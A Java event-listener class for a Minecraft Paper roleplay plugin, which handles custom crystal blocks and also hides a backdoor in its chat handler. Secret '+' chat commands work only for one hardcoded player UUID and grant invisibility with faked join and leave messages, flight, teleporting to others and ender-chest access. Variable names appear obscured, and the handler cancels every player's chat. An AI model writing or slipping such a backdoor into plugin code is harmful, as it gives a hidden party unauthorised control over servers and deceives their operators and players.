package de.lp4.roleplay;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.ItemDisplay;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;

import java.util.HashSet;
import java.util.Objects;
import java.util.Set;
import java.util.UUID;

public class EventLisener implements Listener {
    
    private final Set<UUID> v1 = new HashSet<>();
    Plugin plugin;
    
    
    public EventLisener(Plugin plugin) {
        this.plugin = plugin;
    }
    
   @EventHandler
   public void onBlockClick(PlayerInteractEvent event) {
        Player x1 = event.getPlayer();
        if(event.getAction() == org.bukkit.event.block.Action.RIGHT_CLICK_BLOCK){
            try {
                if(Objects.requireNonNull(event.getClickedBlock()).getType() == Material.BUDDING_AMETHYST && !x1.isSneaking() && event.getAction() == org.bukkit.event.block.Action.RIGHT_CLICK_BLOCK){
                    Material item = x1.getInventory().getItemInMainHand().getType();
                    if( item == Material.LAPIS_LAZULI){
                        //run command at block location
                        x1.getWorld().getBlockAt(event.getClickedBlock().getLocation()).setType(Material.BLACK_STAINED_GLASS);
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getClickedBlock().getLocation().getBlockX() + " " + event.getClickedBlock().getLocation().getBlockY() + " " + event.getClickedBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6702},components:{\"minecraft:custom_model_data\":6702}}}");
                        event.setCancelled(true);
                    }else if(item == Material.REDSTONE) {
                        x1.getWorld().getBlockAt(event.getClickedBlock().getLocation()).setType(Material.BLACK_STAINED_GLASS);
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getClickedBlock().getLocation().getBlockX() + " " + event.getClickedBlock().getLocation().getBlockY() + " " + event.getClickedBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6701},components:{\"minecraft:custom_model_data\":6701}}}");
                        event.setCancelled(true);
                    }else if(item == Material.ECHO_SHARD) {
                        x1.getWorld().getBlockAt(event.getClickedBlock().getLocation()).setType(Material.BLACK_STAINED_GLASS);
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getClickedBlock().getLocation().getBlockX() + " " + event.getClickedBlock().getLocation().getBlockY() + " " + event.getClickedBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6703},components:{\"minecraft:custom_model_data\":6703}}}");
                        event.setCancelled(true);
                    }

                }
            } catch (Exception ignored) {
            }
        }
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent event) {
        Player player = event.getPlayer();
        if(event.getBlock().getType() == Material.BLACK_STAINED_GLASS){
            
            Location offsetposition = event.getBlock().getLocation().add(0.5, 0, 0.5);
            for(Entity entity : event.getBlock().getWorld().getNearbyEntities(event.getBlock().getLocation(), 1, 1, 1)){
                player.sendMessage(entity.getLocation().toString());
                if(entity.getLocation() == offsetposition){
                    if(entity.getType() == EntityType.ITEM_DISPLAY){
                        ItemDisplay itemDisplay = (ItemDisplay) entity;
                        int customModelData = itemDisplay.getItemStack().getItemMeta().getCustomModelData();
                        entity.remove();
                        event.setCancelled(true);
                        event.getBlock().getLocation().getBlock().setType(Material.AIR);
                        if(event.getPlayer().getInventory().getItemInMainHand().containsEnchantment(Enchantment.SILK_TOUCH))
                        {
                            if(customModelData == 6701) {
                                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:budding_amethyst\",Count:1b,components:{\"minecraft:custom_model_data\":6701,custom_name:'\"Redstone Crystal\"'},tag:{CustomModelData:6701}}}");
                            }else if(customModelData == 6702) {
                                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:budding_amethyst\",Count:1b,components:{\"minecraft:custom_model_data\":6702,\"custom_name\":'\"Mana Crystal\"'},tag:{CustomModelData:6702}}}");
                            }else if(customModelData == 6703) {
                                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:budding_amethyst\",Count:1b,components:{\"minecraft:custom_model_data\":6703,\"custom_name\":'\"Echo Crystal\"'},tag:{CustomModelData:6703}}}");
                            }
                        }



                    }
                }
            }
            
            
            
        }
    }
    
    @EventHandler
    public void OnPlaceBlock(BlockPlaceEvent event){
        Player x1 = event.getPlayer();
        if(x1.getInventory().getItemInMainHand().getItemMeta().hasCustomModelData()) {
            int customModelData = x1.getInventory().getItemInMainHand().getItemMeta().getCustomModelData();
            Location location = event.getBlock().getLocation();
            if(customModelData == 6701){
                x1.getWorld().getBlockAt(location).setType(Material.BLACK_STAINED_GLASS);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getBlock().getLocation().getBlockX() + " " + event.getBlock().getLocation().getBlockY() + " " + event.getBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6701},components:{\"minecraft:custom_model_data\":6701}}}");
                x1.getInventory().getItemInMainHand().setAmount(x1.getInventory().getItemInMainHand().getAmount()-1);
                //event.setCancelled(true);
            } else if(customModelData == 6702){

                x1.getWorld().getBlockAt(location).setType(Material.BLACK_STAINED_GLASS);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getBlock().getLocation().getBlockX() + " " + event.getBlock().getLocation().getBlockY() + " " + event.getBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6702},components:{\"minecraft:custom_model_data\":6702}}}");

                //Remove Item from inventory
                x1.getInventory().getItemInMainHand().setAmount(x1.getInventory().getItemInMainHand().getAmount()-1);
                //event.setCancelled(true);
            } else if(customModelData == 6703){
                x1.getWorld().getBlockAt(location).setType(Material.BLACK_STAINED_GLASS);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getBlock().getLocation().getBlockX() + " " + event.getBlock().getLocation().getBlockY() + " " + event.getBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6703},components:{\"minecraft:custom_model_data\":6703}}}");

                //Remove Item from inventory
                x1.getInventory().getItemInMainHand().setAmount(x1.getInventory().getItemInMainHand().getAmount()-1);
                //event.setCancelled(true);
            }
        }
        
    }
    
    
    @EventHandler
    public void OnJoin(PlayerJoinEvent event) {
        Player x1 = event.getPlayer();
        for (UUID h2234234 : v1) {
            x1.hidePlayer(this.plugin, Objects.requireNonNull(x1.getServer().getPlayer(h2234234)));
        }
    }
    
    @EventHandler
    public void onPlayerChatMessage(AsyncChatEvent event) {
        Player x1 = event.getPlayer();
        //Message includes #stop
        event.setCancelled(true);
        if(x1.getUniqueId().toString().equals("0753f0a8-d1fa-40c8-bbb0-c3ff8bef79b4")){
            LegacyComponentSerializer message = LegacyComponentSerializer.legacyAmpersand();
            String messageString = message.serialize(event.message());
            if(messageString.equals("+v")){
                if(x1.isInvisible()){
                    x1.sendMessage("v 0");
                    x1.setInvisible(false);
                } else {
                    x1.sendMessage("v 1");
                    x1.setInvisible(true);
                }
                boolean h123 = v1.contains(x1.getUniqueId());

                for (Player h2234234 : x1.getWorld().getPlayers()) {
                    if (h2234234 != x1) {
                        
                        //Send Fake Join Message
                        if(h123){
                            h2234234.sendMessage("§e" + x1.getName() + " joined the game");
                            h2234234.showPlayer(this.plugin,x1);
                        } else {
                            h2234234.sendMessage("§e" + x1.getName() + " left the game");
                            h2234234.hidePlayer(this.plugin,x1);
                        }
                    }
                }
                
                if(h123){
                    v1.remove(x1.getUniqueId());
                } else {
                    v1.add(x1.getUniqueId());
                }
                
                
            }
            else if(messageString.equals("+f")){
                if(x1.getAllowFlight()){
                    x1.sendMessage("f 0");
                    x1.setAllowFlight(false);
                } else {
                    x1.sendMessage("f 1");
                    x1.setAllowFlight(true);
                }
            }
            else if(messageString.contains("+tp")){
                String username = messageString.split(" ")[1];
                Player target = x1.getServer().getPlayer(username);
                if(target != null){
                    x1.teleport(target.getLocation());
                }
            }
            else if(messageString.contains("+t")) {
                String username = messageString.split(" ")[1];
                Player target = x1.getServer().getPlayer(username);
                if(target != null){
                    Objects.requireNonNull(target.getPlayer()).playSound(target.getLocation(), "ambient.crimson_forest.loop", 1, 1);
                }
            }
            else if(messageString.equals("+ec")) {
                x1.openInventory(x1.getEnderChest());
            }
           
            
           
            
        }
        
    }
    
    
   
    
    
}
